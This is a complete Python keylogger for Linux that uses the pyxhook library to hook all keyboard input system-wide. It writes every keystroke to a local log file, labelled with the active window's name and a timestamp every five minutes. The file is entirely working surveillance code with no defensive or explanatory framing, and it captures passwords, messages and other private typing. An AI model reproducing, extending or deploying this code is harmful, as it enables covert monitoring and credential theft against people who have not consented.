import sys
sys.path.append('/home/abhyudaya/codes/keylogger/pyxhook/')
import pyxhook
import time
import datetime


# Dictionary to convert key texts to symbols or add whitespace padding to the key text
DICT =  { 	'space' : ' ',
		 	'Return': 'Return\n',
		 	'bracketleft':'[',
		 	'bracketright':']',
		 	'BackSpace':' BackSpace ',
		 	'Left':' LeftKey ',
		 	'Right':' RightKey ',
		 	'Up':' UpKey ',
		 	'Down':' DownKey ',
		 	'slash':'/',
		 	'braceleft' : '{',
		 	'braceright' : '}',
		 	'backslash':'\\',
		 	'bar':'|',
		 	'Control_L':' Control_L ',
		 	'Control_R':' Control_R ',
		 	'Shift_L':' Shift_L ',
		 	'Shift_R':' Shift_R ',
		 	'Tab':' Tab ',
		 	'Caps_Lock':' Caps_Lock ',
		 	'semicolon':';',
		 	'colon':':',
		 	'apostrophe':'\'',
		 	'quotedbl':'\"',
		 	'Home':' Home ',
		 	'Page_Up' : ' Page_Up ',
		 	'Next' : ' Next ',
		 	'End' : ' End ',
		 	'comma':',',
		 	'less':'<',
		 	'period':'.',
		 	'greater':'>',
		 	'question':'?',
		 	'Alt_L':' Alt_L ',
		 	'Alt_R':' Alt_R ',
		 	'Escape':' Escape ',
		 	'Menu':' MenuKey ',
		 	'Super_L':' SuperKey ',
		 	'grave':'`',
		 	'asciitilde':'~',
		 	'at':'@',
		 	'exclam':'!',
		 	'numbersign':'#',
		 	'dollar':'$',
		 	'percent':'%',
		 	'asciicircum':'^',
		 	'ampersand':'&',
		 	'asterisk':'*',
		 	'parenleft':'(',
		 	'parenright':')',
			'underscore':'_',
			'plus':'+',
			'minus':'-',
			'equal':'=',
			'Insert':' InsertKey ',
			'Print':' PrintScreen ',
			'Delete':' DeleteKey ',
			'F1':' F1 ',
			'F2':' F2 ',
			'F3':' F3 ',
			'F4':' F4 ',
			'F5':' F5 ',
			'F6':' F6 ',
			'F7':' F7 ',
			'F8':' F8 ',
			'F9':' F9 ',
			'F10':' F10 ',
			'F11':' F11 ',
			'F12':' F12 '
		 }

#key press event handler for pyxhook 
def kbevent(event) :

	global prevWindow,oldTimeStamp

	f = open('log.txt','a+')

	CurrentTime = datetime.datetime.now()
	AheadTime = oldTimeStamp + datetime.timedelta(seconds = 300)

	#new time stamp every 5 mins
	if( CurrentTime > AheadTime):
		f.write('\n')
		f.write(str(CurrentTime)[0:19])
		f.write('\n')
		oldTimeStamp = CurrentTime

	#if window has changed write new window name
	if(event.WindowProcName != prevWindow):
		f.write('\n\n')
		f.write('Window : '+event.WindowProcName)
		f.write('\n')
		prevWindow = event.WindowProcName

	#write down pressed key
	if event.Key in DICT.keys():
		f.write(DICT[event.Key])
	else:
		f.write(event.Key)

	f.close()


if __name__ == '__main__':

	#initialize time stamp and window name
	#to make sure a timestamp is created when the process is run for the first time
	oldTimeStamp = datetime.datetime.now() + datetime.timedelta(seconds = -300)
	prevWindow = ''

	#initialize pyxhook manager
	hookman = pyxhook.HookManager()
	hookman.KeyDown = kbevent
	hookman.HookKeyboard()
	hookman.start()

	running = True
	while(running):
		time.sleep(0.1)

	hookman.cancel()